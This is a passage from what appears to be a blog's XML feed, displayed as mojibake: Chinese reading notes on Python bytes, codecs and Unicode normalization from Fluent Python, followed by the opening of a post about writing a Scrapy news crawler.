å†…ç½®äº†ä¸¤ç§åŸºæœ¬çš„äºŒè¿›åˆ¶åºåˆ—ç±»å‹ï¼šPython 3 å¼•å…¥çš„ä¸å¯å˜ bytes ç±»å‹å’Œ Python 2.6 æ·»åŠ çš„å¯å˜bytearray ç±»å‹ã€‚ bytes æˆ– bytearray å¯¹è±¡çš„å„ä¸ªå…ƒç´ æ˜¯ä»‹äº 0~255(0x0~0xff)ä¹‹é—´çš„æ•´æ•°ã€‚byteså¯¹è±¡çš„åˆ‡ç‰‡è¿˜æ˜¯byteså¯¹è±¡ï¼Œæœ€å°å•ä½æ˜¯é•¿åº¦ä¸º1çš„byteså¯¹è±¡. bytearray å¯¹è±¡çš„åˆ‡ç‰‡è¿˜æ˜¯ bytearray å¯¹è±¡ã€‚ é™¤äº†æ ¼å¼åŒ–æ–¹æ³•ï¼ˆformat å’Œ format_mapï¼‰å’Œå‡ ä¸ªå¤„ç† Unicode æ•°æ®çš„æ–¹æ³•ï¼ˆåŒ…æ‹¬casefoldã€isdecimalã€isidentifierã€isnumericã€isprintable å’Œ encodeï¼‰ä¹‹å¤–ï¼Œstr ç±»å‹çš„å…¶ä»–æ–¹æ³•éƒ½æ”¯æŒ bytes å’Œ bytearray ç±»å‹ã€‚è¿™æ„å‘³ç€ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç†Ÿæ‚‰çš„å­—ç¬¦ä¸²æ–¹æ³•å¤„ç†äºŒè¿›åˆ¶åºåˆ—ï¼Œå¦‚ endswithã€replaceã€stripã€translateã€upperç­‰ï¼Œåªæœ‰å°‘æ•°å‡ ä¸ªå…¶ä»–æ–¹æ³•çš„å‚æ•°æ˜¯ bytes å¯¹è±¡ï¼Œè€Œä¸æ˜¯ str å¯¹è±¡ã€‚æ­¤å¤–ï¼Œå¦‚æœæ­£åˆ™è¡¨è¾¾å¼ç¼–è¯‘è‡ªäºŒè¿›åˆ¶åºåˆ—è€Œä¸æ˜¯å­—ç¬¦ä¸²ï¼Œre æ¨¡å—ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼å‡½æ•°ä¹Ÿèƒ½å¤„ç†äºŒè¿›åˆ¶åºåˆ—. äºŒè¿›åˆ¶åºåˆ—æœ‰ä¸ªç±»æ–¹æ³•æ˜¯ str æ²¡æœ‰çš„ï¼Œåä¸º fromhex: 12bytes.fromhex('31 4B CE A9')b'1K\xce\xa9' æ–°å»ºbytesæˆ–bytearrayå¯ä»¥è°ƒç”¨å„è‡ªçš„æ„é€ æ–¹æ³•: ä¸€ä¸ªstrå¯¹è±¡å’Œä¸€ä¸ªencodingå‚æ•° ä¸€ä¸ªæä¾›0~0xffçš„æ•´æ•°çš„å¯è¿­ä»£å¯¹è±¡ ä¸€ä¸ªå®ç°äº†ç¼“å†²åè®®çš„å¯¹è±¡(buffer protocol, ä¾‹å¦‚bytes, bytearray, memory view, array.array) ç»“æ„ä½“å’Œå†…å­˜è§†å›¾(struct and memory view)struct æ¨¡å—èƒ½å¤„ç†bytesã€bytearray å’Œ memoryview å¯¹è±¡, èƒ½å°†æ‰“åŒ…çš„å­—èŠ‚åºåˆ—å’Œä¸åŒç±»å‹å­—æ®µç»„æˆçš„å…ƒç»„ç›¸äº’è½¬æ¢ã€‚memoryview ç±»ä¸æ˜¯ç”¨äºåˆ›å»ºæˆ–å­˜å‚¨å­—èŠ‚åºåˆ—çš„ï¼Œè€Œæ˜¯å…±äº«å†…å­˜ï¼Œè®©ä½ è®¿é—®å…¶ä»–äºŒè¿›åˆ¶åºåˆ—ã€æ‰“åŒ…çš„æ•°ç»„å’Œç¼“å†²ä¸­çš„æ•°æ®åˆ‡ç‰‡ï¼Œè€Œæ— éœ€å¤åˆ¶å­—èŠ‚åºåˆ—ã€‚ 12345678910111213141516import structfmt = '&lt;3s3sHH' #æ ¼å¼ï¼š&lt; æ˜¯å°å­—èŠ‚åºï¼Œ3s3s æ˜¯ä¸¤ä¸ª 3 å­—èŠ‚åºåˆ—ï¼ŒHH æ˜¯ä¸¤ä¸ª 16 ä½äºŒè¿›åˆ¶æ•´æ•°ã€‚with open('filter.gif', 'rb') as fp: img = memoryview(fp.read()) #åˆ›å»ºä¸€ä¸ªå†…å­˜è§†å›¾header = img[:10] #headerä¹Ÿæ˜¯ä¸€ä¸ªå†…å­˜è§†å›¾bytes(header) # b'GIF89a+\x02\xe6\x00'struct.unpack(fmt, header) # (b'GIF', b'89a', 555, 230) åˆ†åˆ«ä»£è¡¨æ–‡ä»¶ç±»å‹,ç‰ˆæœ¬,å®½åº¦,é«˜åº¦del header # åˆ é™¤å¼•ç”¨, é‡Šæ”¾å†…å­˜del img åŸºæœ¬çš„ç¼–è§£ç å™¨Python è‡ªå¸¦äº†è¶…è¿‡ 100 ç§ç¼–è§£ç å™¨ï¼ˆcodec, encoder/decoderï¼‰ï¼Œç”¨äºåœ¨æ–‡æœ¬å’Œå­—èŠ‚ä¹‹é—´ç›¸äº’è½¬æ¢ã€‚æ¯ä¸ªç¼–è§£ç å™¨éƒ½æœ‰ä¸€ä¸ªåç§°ï¼Œå¦‚ â€˜utf_8â€™ï¼Œè€Œä¸”ç»å¸¸æœ‰å‡ ä¸ªåˆ«åï¼Œå¦‚â€™utf8â€™ã€â€™utf-8â€™ å’Œ â€˜U8â€™ã€‚è¿™äº›åç§°å¯ä»¥ä¼ ç»™open()ã€str.encode()ã€bytes.decode() ç­‰å‡½æ•°çš„ encoding å‚æ•°ã€‚ 123456&gt;&gt;&gt; for codec in ['latin_1', 'utf_8', 'utf_16']:... print(codec, 'El NiÃ±o'.encode(codec), sep='\t')...latin_1 b'El Ni\xf1o'utf_8 b'El Ni\xc3\xb1o'utf_16 b'\xff\xfeE\x00l\x00 \x00N\x00i\x00\xf1\x00o\x00' æŸäº›ç¼–ç ï¼ˆå¦‚ ASCII å’Œå¤šå­—èŠ‚çš„ GB2312ï¼‰ä¸èƒ½è¡¨ç¤ºæ‰€æœ‰ Unicodeå­—ç¬¦ã€‚ç„¶è€Œï¼ŒUTF ç¼–ç çš„è®¾è®¡ç›®çš„å°±æ˜¯å¤„ç†æ¯ä¸€ä¸ª Unicode ç ä½ã€‚ ä¸€äº›å…¸å‹ç¼–ç : latin1: ä¸€ç§é‡è¦çš„ç¼–ç ï¼Œæ˜¯å…¶ä»–ç¼–ç çš„åŸºç¡€ï¼Œä¾‹å¦‚ cp1252 å’Œ Unicodeï¼ˆæ³¨æ„ï¼Œlatin1 ä¸cp1252 çš„å­—èŠ‚å€¼æ˜¯ä¸€æ ·çš„ï¼Œç”šè‡³è¿ç ä½ä¹Ÿç›¸åŒï¼‰ cp1252:Microsoft åˆ¶å®šçš„ latin1 è¶…é›†ï¼Œæ·»åŠ äº†æœ‰ç”¨çš„ç¬¦å·ï¼Œä¾‹å¦‚å¼¯å¼•å·å’Œâ‚¬ï¼ˆæ¬§å…ƒï¼‰ï¼›æœ‰äº›Windows åº”ç”¨æŠŠå®ƒç§°ä¸ºâ€œANSIâ€ï¼Œä½†å®ƒå¹¶ä¸æ˜¯ ANSI æ ‡å‡†ã€‚ cp437: IBM PC æœ€åˆçš„å­—ç¬¦é›†ï¼ŒåŒ…å«æ¡†å›¾ç¬¦å·ã€‚ä¸åæ¥å‡ºç°çš„ latin1 ä¸å…¼å®¹ã€‚ gb2312:ç”¨äºç¼–ç ç®€ä½“ä¸­æ–‡çš„é™ˆæ—§æ ‡å‡†ï¼›è¿™æ˜¯äºšæ´²è¯­è¨€ä¸­ä½¿ç”¨è¾ƒå¹¿æ³›çš„å¤šå­—èŠ‚ç¼–ç ä¹‹ä¸€ã€‚ utf-8:ç›®å‰ Web ä¸­æœ€å¸¸è§çš„ 8 ä½ç¼–ç ï¼› ä¸ ASCII å…¼å®¹ï¼ˆçº¯ ASCII æ–‡æœ¬æ˜¯æœ‰æ•ˆçš„ UTF-8 æ–‡æœ¬ï¼‰ã€‚ utf-16le: UTF-16 çš„ 16 ä½ç¼–ç æ–¹æ¡ˆçš„ä¸€ç§å½¢å¼ï¼›æ‰€æœ‰ UTF-16 æ”¯æŒé€šè¿‡è½¬ä¹‰åºåˆ—ï¼ˆç§°ä¸ºâ€œä»£ç†å¯¹â€ï¼Œsurrogate pairï¼‰è¡¨ç¤ºè¶…è¿‡ U+FFFF çš„ç ä½ã€‚ ç¼–è§£ç ä¸­å‡ºç°çš„é—®é¢˜UnicodeEncodeErroræŠŠæ–‡æœ¬è½¬æ¢æˆå­—èŠ‚åºåˆ—æ—¶ï¼Œå¦‚æœç›®æ ‡ç¼–ç ä¸­æ²¡æœ‰å®šä¹‰æŸä¸ªå­—ç¬¦ï¼Œé‚£å°±ä¼šæŠ›å‡º UnicodeEncodeError UnicodeDecodeErrorä¸æ˜¯æ¯ä¸€ä¸ªå­—èŠ‚éƒ½åŒ…å«æœ‰æ•ˆçš„ ASCII å­—ç¬¦ï¼Œä¹Ÿä¸æ˜¯æ¯ä¸€ä¸ªå­—ç¬¦åºåˆ—éƒ½æ˜¯æœ‰æ•ˆçš„ UTF-8 æˆ– UTF-16ã€‚å› æ­¤ï¼ŒæŠŠäºŒè¿›åˆ¶åºåˆ—è½¬æ¢æˆæ–‡æœ¬æ—¶ï¼Œå¦‚æœå‡è®¾æ˜¯è¿™ä¸¤ä¸ªç¼–ç ä¸­çš„ä¸€ä¸ªï¼Œé‡åˆ°æ— æ³•è½¬æ¢çš„å­—èŠ‚åºåˆ—æ—¶ä¼šæŠ›å‡º UnicodeDecodeErrorä¸€äº›é™ˆæ—§çš„8ä½ç¼–ç å¯ä»¥è§£ç ä»»ä½•å­—èŠ‚åºåˆ—ï¼Œä¸æŠ›å‡ºé”™è¯¯ï¼Œä½†æ˜¯ä¼šå¾—åˆ°æ— ç”¨çš„è¾“å‡ºã€‚ ä½¿ç”¨é¢„æœŸä¹‹å¤–çš„ç¼–ç åŠ è½½æ¨¡å—æ—¶æŠ›å‡ºçš„SyntaxErrorPython 3 é»˜è®¤ä½¿ç”¨ UTF-8 ç¼–ç æºç ï¼ŒPython 2ï¼ˆä» 2.5 å¼€å§‹ï¼‰åˆ™é»˜è®¤ä½¿ç”¨ ASCIIã€‚å¦‚æœåŠ è½½çš„ .py æ¨¡å—ä¸­åŒ…å« UTF-8 ä¹‹å¤–çš„æ•°æ®ï¼Œè€Œä¸”æ²¡æœ‰å£°æ˜ç¼–ç ï¼Œä¼šæŠ›å‡ºSyntaxErrorè¿™ä¸ªé—®é¢˜å¯ä»¥åœ¨æ–‡ä»¶çš„å‰ä¸¤è¡ŒåŠ å…¥#encoding:${encoding_name}è§£å†³ã€‚ æ‰¾å‡ºä¸€ä¸ªå­—èŠ‚åºåˆ—çš„ç¼–ç å•çº¯çš„å­—èŠ‚åºåˆ—æ˜¯æ— æ³•æ‰¾å‡ºç¼–ç çš„ï¼Œå¿…é¡»é€šè¿‡åè®®/è§„å®šçš„æ ¼å¼å‘ŠçŸ¥è§£ç è€…ã€‚â€”â€”æœ‰äº›é€šä¿¡åè®®å’Œæ–‡ä»¶æ ¼å¼ï¼Œå¦‚ HTTP å’Œ XMLï¼ŒåŒ…å«æ˜ç¡®æŒ‡æ˜å†…å®¹ç¼–ç çš„é¦–éƒ¨ã€‚ä½†æ˜¯å­—èŠ‚æµä¹Ÿå¯ä»¥é€šè¿‡å¯»æ‰¾è§„åˆ™æ¥åˆ¤æ–­å¯èƒ½çš„ç¼–ç : ä¾‹å¦‚ï¼Œå¦‚æœ bâ€™\x00â€™ å­—èŠ‚ç»å¸¸å‡ºç°ï¼Œé‚£ä¹ˆå¯èƒ½æ˜¯ 16 ä½æˆ– 32ä½ç¼–ç ï¼Œè€Œä¸æ˜¯ 8 ä½ç¼–ç æ–¹æ¡ˆï¼Œå› ä¸ºçº¯æ–‡æœ¬ä¸­ä¸èƒ½åŒ…å«ç©ºå­—ç¬¦ï¼›å¦‚æœå­—èŠ‚åºåˆ—bâ€™\x20\x00â€™ ç»å¸¸å‡ºç°ï¼Œé‚£ä¹ˆå¯èƒ½æ˜¯ UTF-16LE ç¼–ç ä¸­çš„ç©ºæ ¼å­—ç¬¦ï¼ˆU+0020ï¼‰ç»Ÿä¸€å­—ç¬¦ç¼–ç ä¾¦æµ‹åŒ… Chardetï¼ˆhttps://pypi.python.org/pypi/chardetï¼‰å°±æ˜¯è¿™æ ·å·¥ä½œçš„ï¼Œå®ƒèƒ½è¯†åˆ«æ‰€æ”¯æŒçš„ 30 ç§ç¼–ç . BOMï¼šæœ‰ç”¨çš„é¬¼ç¬¦utf-16ç¼–ç çš„åºåˆ—å¼€å¤´ä¼šæœ‰å‡ ä¸ªé¢å¤–çš„å­—èŠ‚ï¼Œç§°ä¸ºBOMï¼Œå³å­—èŠ‚åºæ ‡è®°ï¼ˆbyte-order markï¼‰ï¼ŒæŒ‡æ˜å­—èŠ‚åºã€‚å°å­—èŠ‚åºè®¾å¤‡ä¸­ï¼Œä½8ä½åœ¨å‰ï¼Œé«˜8ä½åœ¨åï¼Œå¤§å­—èŠ‚åºçš„è®¾å¤‡åˆ™åä¹‹ã€‚UTF-16 æœ‰ä¸¤ä¸ªå˜ç§ï¼šUTF-16LEï¼Œæ˜¾å¼æŒ‡æ˜ä½¿ç”¨å°å­—èŠ‚åºï¼›UTF-16BEï¼Œæ˜¾å¼æŒ‡æ˜ä½¿ç”¨å¤§å­—èŠ‚åºã€‚å¦‚æœä½¿ç”¨è¿™ä¸¤ä¸ªå˜ç§ï¼Œä¸ä¼šç”Ÿæˆ BOMä¸å­—èŠ‚åºæœ‰å…³çš„é—®é¢˜åªå¯¹ä¸€ä¸ªå­—ï¼ˆwordï¼‰å å¤šä¸ªå­—èŠ‚çš„ç¼–ç ï¼ˆå¦‚ UTF-16 å’Œ UTF-32ï¼‰æœ‰å½±å“ã€‚UTF-8 çš„ä¸€å¤§ä¼˜åŠ¿æ˜¯ï¼Œä¸ç®¡è®¾å¤‡ä½¿ç”¨å“ªç§å­—èŠ‚åºï¼Œç”Ÿæˆçš„å­—èŠ‚åºåˆ—å§‹ç»ˆä¸€è‡´ï¼Œå› æ­¤ä¸éœ€è¦ BOMã€‚ å¤„ç†æ–‡æœ¬å¤„ç†æ–‡æœ¬çš„æœ€ä½³å®è·µæ˜¯â€œUnicode ä¸‰æ˜æ²»â€ï¼ˆè¦å°½æ—©æŠŠè¾“å…¥ï¼ˆä¾‹å¦‚è¯»å–æ–‡ä»¶æ—¶ï¼‰çš„å­—èŠ‚åºåˆ—è§£ç æˆå­—ç¬¦ä¸²ï¼Œå¤„ç†è¿‡ç¨‹å…¨éƒ¨ç”¨å­—ç¬¦ä¸²ï¼Œè¾“å‡ºæ—¶å°½é‡æ™šç¼–ç æˆå­—ç¬¦åºåˆ—) æ–‡æœ¬å¤„ç†ä¸­çš„ä¸€äº›è¦ç‚¹: éœ€è¦åœ¨å¤šå°è®¾å¤‡ä¸­æˆ–å¤šç§åœºåˆä¸‹è¿è¡Œçš„ä»£ç ï¼Œä¸€å®šä¸èƒ½ä¾èµ–é»˜è®¤ç¼–ç ã€‚æ‰“å¼€æ–‡ä»¶æ—¶å§‹ç»ˆåº”è¯¥æ˜ç¡®ä¼ å…¥ encoding= å‚æ•°ï¼Œå› ä¸ºä¸åŒçš„è®¾å¤‡ä½¿ç”¨çš„é»˜è®¤ç¼–ç å¯èƒ½ä¸åŒã€‚ é™¤éæƒ³åˆ¤æ–­ç¼–ç ï¼Œå¦åˆ™ä¸è¦åœ¨äºŒè¿›åˆ¶æ¨¡å¼ä¸­æ‰“å¼€æ–‡æœ¬æ–‡ä»¶ï¼›å³ä¾¿å¦‚æ­¤ï¼Œä¹Ÿåº”è¯¥ä½¿ç”¨ Chardetï¼Œè€Œä¸æ˜¯é‡æ–°å‘æ˜è½®å­ã€‚å¸¸è§„ä»£ç åªåº”è¯¥ä½¿ç”¨äºŒè¿›åˆ¶æ¨¡å¼æ‰“å¼€äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ ä¸ºäº†æ­£ç¡®çš„æ¯”è¾ƒè§„èŒƒåŒ–Unicode å­—ç¬¦ä¸²åœ¨ Unicode æ ‡å‡†ä¸­ï¼Œâ€™Ã©â€™å’Œ â€˜e\u0301â€™ è¿™æ ·çš„åºåˆ—å«â€œæ ‡å‡†ç­‰ä»·ç‰©â€ï¼ˆcanonical equivalentï¼‰ï¼Œåº”ç”¨ç¨‹åºåº”è¯¥æŠŠå®ƒä»¬è§†ä½œç›¸åŒçš„å­—ç¬¦ã€‚ä½†æ˜¯ï¼ŒPython çœ‹åˆ°çš„æ˜¯ä¸åŒçš„ç ä½åºåˆ—ï¼Œå› æ­¤åˆ¤å®šäºŒè€…ä¸ç›¸ç­‰ã€‚ä¸Šè¿°çš„é—®é¢˜çš„è§£å†³æ–¹æ¡ˆæ˜¯è§„èŒƒåŒ–Unicodeå­—ç¬¦ä¸²ã€‚é€šå¸¸æ˜¯ä½¿ç”¨ unicodedata.normalize å‡½æ•°æä¾›çš„ Unicode è§„èŒƒåŒ–ã€‚ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯â€™NFCâ€™ã€â€™NFDâ€™ã€â€™NFKCâ€™ å’Œ â€˜NFKDâ€™ä¹‹ä¸€ã€‚NFCï¼ˆNormalization Form Cï¼‰ä½¿ç”¨æœ€å°‘çš„ç ä½æ„æˆç­‰ä»·çš„å­—ç¬¦ä¸²ï¼Œè€Œ NFD æŠŠç»„åˆå­—ç¬¦åˆ†è§£æˆåŸºå­—ç¬¦å’Œå•ç‹¬çš„ç»„åˆå­—ç¬¦ã€‚è¿™ä¸¤ç§è§„èŒƒåŒ–æ–¹å¼éƒ½èƒ½è®©æ¯”è¾ƒè¡Œä¸ºç¬¦åˆé¢„æœŸã€‚NFKC å’Œ NFKDçš„é¦–å­—æ¯ç¼©ç•¥è¯ä¸­ï¼Œå­—æ¯ K è¡¨ç¤ºâ€œcompatibilityâ€ï¼ˆå…¼å®¹æ€§ï¼‰ã€‚è¿™ä¸¤ç§æ˜¯è¾ƒä¸¥æ ¼çš„è§„èŒƒåŒ–å½¢å¼ï¼Œå¯¹â€œå…¼å®¹å­—ç¬¦â€æœ‰å½±å“ã€‚ç”±äºè¿™ä¸€èŠ‚çš„å†…å®¹çš„é¢†åŸŸåå‘æ€§å¤ªè¿‡ä¸¥é‡ï¼Œä¸€èˆ¬å·¥ä½œä¸ä¼šè§åˆ°ï¼Œåªæ˜¯ç•¥ä½œäº†è§£ï¼Œç¢°åˆ°ç›¸å…³é—®é¢˜å†ç»†æŸ¥ æ”¯æŒå­—ç¬¦ä¸²å’Œå­—èŠ‚åºåˆ—çš„åŒæ¨¡å¼APIæ­£åˆ™è¡¨è¾¾å¼å¦‚æœä½¿ç”¨å­—èŠ‚åºåˆ—æ„å»ºæ­£åˆ™è¡¨è¾¾å¼ï¼Œ\d å’Œ \w ç­‰æ¨¡å¼åªèƒ½åŒ¹é… ASCII å­—ç¬¦ï¼›ç›¸æ¯”ä¹‹ä¸‹ï¼Œå¦‚æœæ˜¯å­—ç¬¦ä¸²æ¨¡å¼ï¼Œå°±èƒ½åŒ¹é… ASCII ä¹‹å¤–çš„ Unicode æ•°å­—æˆ–å­—æ¯ã€‚ 123456789101112131415import rere_numbers_str = re.compile(r'\d+')re_words_str = re.compile(r'\w+')re_numbers_bytes = re.compile(rb'\d+')re_words_bytes = re.compile(rb'\w+')text_str = ("Ramanujan saw \u0be7\u0bed\u0be8\u0bef" " as 1729 = 1Â³ + 12Â³ = 9Â³ + 10Â³.") text_bytes = text_str.encode('utf_8') print('Text', repr(text_str), sep='\n ')print('Numbers')print(' str :', re_numbers_str.findall(text_str)) print(' bytes:', re_numbers_bytes.findall(text_bytes)) print('Words')print(' str :', re_words_str.findall(text_str)) print(' bytes:', re_words_bytes.findall(text_bytes)) ä¸Šé¢è¿™æ®µä»£ç çš„è¾“å‡º: Text â€˜Ramanujan saw à¯§à¯­à¯¨à¯¯ as 1729 = 1Â³ + 12Â³ = 9Â³ + 10Â³.â€™Numbers str : [â€˜à¯§à¯­à¯¨à¯¯â€™, â€˜1729â€™, â€˜1â€™, â€˜12â€™, â€˜9â€™, â€˜10â€™] bytes: [bâ€™1729â€™, bâ€™1â€™, bâ€™12â€™, bâ€™9â€™, bâ€™10â€™]Words str : [â€˜Ramanujanâ€™, â€˜sawâ€™, â€˜à¯§à¯­à¯¨à¯¯â€™, â€˜asâ€™, â€˜1729â€™, â€˜1Â³â€™, â€˜12Â³â€™, â€˜9Â³â€™, â€˜10Â³â€™] bytes: [bâ€™Ramanujanâ€™, bâ€™sawâ€™, bâ€™asâ€™, bâ€™1729â€™, bâ€™1â€™, bâ€™12â€™, bâ€™9â€™, bâ€™10â€™] oså‡½æ•°GNU/Linux å†…æ ¸ä¸ç†è§£ Unicodeï¼Œå¯¹ä»»ä½•åˆç†çš„ç¼–ç æ–¹æ¡ˆæ¥è¯´ï¼Œåœ¨æ–‡ä»¶åä¸­ä½¿ç”¨å­—èŠ‚åºåˆ—éƒ½æ˜¯æ— æ•ˆçš„ï¼Œæ— æ³•è§£ç æˆå­—ç¬¦ä¸²ã€‚åœ¨ä¸åŒæ“ä½œç³»ç»Ÿä¸­ä½¿ç”¨å„ç§å®¢æˆ·ç«¯çš„æ–‡ä»¶æœåŠ¡å™¨ï¼Œåœ¨é‡åˆ°è¿™ä¸ªé—®é¢˜æ—¶å°¤å…¶å®¹æ˜“å‡ºé”™ã€‚ä¸ºäº†è§„é¿è¿™ä¸ªé—®é¢˜ï¼Œos æ¨¡å—ä¸­çš„æ‰€æœ‰å‡½æ•°ã€æ–‡ä»¶åæˆ–è·¯å¾„åå‚æ•°æ—¢èƒ½ä½¿ç”¨å­—ç¬¦ä¸²ï¼Œä¹Ÿèƒ½ä½¿ç”¨å­—èŠ‚åºåˆ—ã€‚å¦‚æœè¿™æ ·çš„å‡½æ•°ä½¿ç”¨å­—ç¬¦ä¸²å‚æ•°è°ƒç”¨ï¼Œè¯¥å‚æ•°ä¼šä½¿ç”¨sys.getfilesystemencoding() å¾—åˆ°çš„ç¼–è§£ç å™¨è‡ªåŠ¨ç¼–ç ï¼Œç„¶åæ“ä½œç³»ç»Ÿä¼šä½¿ç”¨ç›¸åŒçš„ç¼–è§£ç å™¨è§£ç ã€‚è¿™å‡ ä¹å°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„è¡Œä¸ºï¼Œä¸ Unicode ä¸‰æ˜æ²»æœ€ä½³å®è·µä¸€è‡´ã€‚åˆ©ç”¨è¿™ä¸€ç‰¹æ€§å¯ä»¥ä¿®å¤ä¸€äº›å«æœ‰é¬¼ç¬¦çš„æ–‡ä»¶åã€‚ æ€»ç»“ éšç€ Unicode çš„å¹¿æ³›ä½¿ç”¨ï¼ˆ80% çš„ç½‘ç«™å·²ç»ä½¿ç”¨ UTF-8ï¼‰ï¼Œæˆ‘ä»¬å¿…é¡»æŠŠæ–‡æœ¬å­—ç¬¦ä¸²ä¸å®ƒä»¬åœ¨æ–‡ä»¶ä¸­çš„äºŒè¿›åˆ¶åºåˆ—è¡¨è¿°åŒºåˆ†å¼€ï¼Œè€Œ Python 3 ä¸­è¿™ä¸ªåŒºåˆ†æ˜¯å¼ºåˆ¶çš„ã€‚ è¿™ä¸€éƒ¨åˆ†è¦è§£å†³çš„é—®é¢˜å¤§å¤šæ˜¯ä¸€äº›ç”±äºåœ°åŒº/è¯­è¨€ä¸é€šé€ æˆçš„ç¼–ç å·®å¼‚ï¼Œè¿™ç§å·®å¼‚å¯ä»¥é€šè¿‡è§„èŒƒåŒ–Unicodeè§£å†³,ä¹Ÿå¯ä»¥é€šè¿‡è§„èŒƒåŒ–ç¼–ç è§£å†³ã€‚ Unicode å¼‚å¸¸å¤æ‚ï¼Œå……æ»¡ç‰¹æ®Šæƒ…å†µï¼Œè€Œä¸”è¦è¦†ç›–å„ç§äººç±»è¯­è¨€å’Œäº§ä¸šæ ‡å‡†ç­–ç•¥ã€‚æ‰€ä»¥è¦åšåˆ°å®Œç¾çš„å¤„ç†éå¸¸å›°éš¾ã€‚ Python 3.3 èµ·ï¼Œåˆ›å»º str å¯¹è±¡æ—¶ï¼Œè§£é‡Šå™¨ä¼šæ£€æŸ¥é‡Œé¢çš„å­—ç¬¦ï¼Œç„¶åä¸ºè¯¥å­—ç¬¦ä¸²é€‰æ‹©æœ€ç»æµçš„å†…å­˜å¸ƒå±€ï¼šå¦‚æœå­—ç¬¦éƒ½åœ¨ latin1 å­—ç¬¦é›†ä¸­ï¼Œé‚£å°±ä½¿ç”¨ 1 ä¸ªå­—èŠ‚å­˜å‚¨æ¯ä¸ªç ä½ï¼›å¦åˆ™ï¼Œæ ¹æ®å­—ç¬¦ä¸²ä¸­çš„å…·ä½“å­—ç¬¦ï¼Œé€‰æ‹© 2 ä¸ªæˆ– 4 ä¸ªå­—èŠ‚å­˜å‚¨æ¯ä¸ªç ä½ã€‚ Python 3 å¯¹ int ç±»å‹çš„å¤„ç†æ–¹å¼ï¼šå¦‚æœä¸€ä¸ªæ•´æ•°åœ¨ä¸€ä¸ªæœºå™¨å­—ä¸­æ”¾å¾—ä¸‹ï¼Œé‚£å°±å­˜å‚¨åœ¨ä¸€ä¸ªæœºå™¨å­—ä¸­ï¼›å¦åˆ™è§£é‡Šå™¨åˆ‡æ¢æˆå˜é•¿è¡¨è¿°ï¼Œç±»ä¼¼äºPython 2 ä¸­çš„ long ç±»å‹ã€‚]]></content>
      <categories>
        <category>è¯»ä¹¦ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>fluent python</tag>
        <tag>bytes</tag>
        <tag>unicode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½¿ç”¨scrapyæ­å»ºä¸€ä¸ªç®€å•çš„æ–°é—»çˆ¬è™«]]></title>
    <url>%2F2017%2F11%2F23%2Fscrapy_crawler_01%2F</url>
    <content type="text"><![CDATA[æœ¬æ–‡ä»‹ç»äº†å¦‚ä½•ä½¿ç”¨scrapyæ­å»ºä¸€ä¸ªç®€å•çš„æ–°é—»çˆ¬è™«ã€‚ ä½¿ç”¨scrapyæ­å»ºä¸€ä¸ªç®€å•çš„æ–°é—»çˆ¬è™«å‰æ®µæ—¶é—´é¢äº†å‡ å®¶å…¬å¸çš„çˆ¬è™«å·¥ç¨‹å¸ˆå²—ä½ã€‚æ‰€æœ‰çš„å…¬å¸éƒ½ä¼šé—®çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯: ä½ ä½¿ç”¨è¿‡å“ªç§çˆ¬è™«æ¡†æ¶ï¼Ÿç†Ÿç»ƒåº¦å¦‚ä½•ï¼Ÿæ˜¯å¦èƒ½æ ¹æ®éœ€æ±‚ä¿®æ”¹æ¡†æ¶æºç ï¼Ÿæœ‰è¿‡åˆ†å¸ƒå¼çˆ¬å–çš„ç»éªŒå—ï¼Ÿæ¯æ¬¡æˆ‘é‡åˆ°è¿™ç§é—®é¢˜éƒ½æ„Ÿåˆ°å¾ˆå°´å°¬ â€”â€” ç°åœ¨ä¸»æµçš„çˆ¬è™«æ¡†æ¶å¤§æ¦‚æœ‰Scrapy, PySpider(Python); Nutch, Heritrix(Java) â€”â€” è¿™äº›æˆ‘ä¸€ä¸ªéƒ½æ²¡ç”¨è¿‡, ç›®å‰åœ¨çº¿ä¸Šè¿è¡Œçš„çˆ¬è™«å…¨æ˜¯ requests + json/html/xml è§£æã€‚è‡³äºåˆ†å¸ƒå¼çˆ¬è™«, ç”±äºæˆ‘ç›®å‰æ¥è§¦çš„é¡¹ç›®çˆ¬å–é‡æ¯”è¾ƒå°(200+æ–°é—»appï¼Œ300+æ–°é—»åª’ä½“å¾®ä¿¡å…¬ä¼—å·ï¼Œ300+å¾®åšçš„æ¯æ—¥å¢é‡çˆ¬å–), æ¯å¤©çš„çˆ¬å–é‡ä¸€å°1æ ¸/1G/1Mçš„é˜¿é‡Œäº‘è¶³å¤Ÿèƒœä»»äº†, æš‚æ—¶è¿˜ç”¨ä¸åˆ°åˆ†å¸ƒå¼çˆ¬å–â€¦â€¦ å¦å¤–åˆ†å¸ƒå¼çˆ¬å–å¤§å¤šä¾èµ–ä¸Šé¢æåˆ°çš„æ¡†æ¶ã€‚ æ‰€ä»¥æˆ‘åšäº†ä¸€ä¸ªå¾ˆè‰°éš¾çš„å†³å®šï¼æŠŠä¹‹å‰å†™è¿‡çš„çˆ¬è™«ï¼ç”¨scrapyé‡æ–°å®ç°ä¸€éï¼ â€¦â€¦â€¦â€¦â€¦â€¦ å¥½å§ï¼Œçš„ç¡®æœ‰ç‚¹è‰°éš¾â€¦â€¦ æ‰€ä»¥å…ˆä»å…¶ä¸­ä¸€ä¸ªå¼€å§‹å§ã€‚ ä¸‹é¢ä¼šè®²åˆ°å¦‚ä½•ä½¿ç”¨scrapy ç¼–å†™ä¸€ä¸ªç½‘æ˜“æ–°é—»appçš„çˆ¬è™«ã€‚ * æˆ‘é€‰æ‹©äº†ä¸€æœ¬å‚è€ƒä¹¦ç± ã€Šlearning scrapyã€‹, ä½†æ˜¯è¿™æœ¬ä¹¦çˆ¬å–çš„ç¤ºä¾‹ç½‘ç«™éœ€è¦ç¿»å¢™ï¼Œæ‰€ä»¥æˆ‘åªçœ‹äº†æ¡†æ¶ç›¸å…³çš„éƒ¨åˆ†ï¼Œå®é™…ç½‘é¡µè§£æä¹‹ç±»çš„äº‹æƒ…ï¼Œåœ¨ä¿®æ”¹ä¹‹å‰çš„çˆ¬è™«çš„è¿‡ç¨‹ä¸­è§£å†³ã€‚ 1. ç¯å¢ƒé…ç½®æˆ‘å¼€å‘ä½¿ç”¨ç”µè„‘çš„æ˜¯Mac OSX, 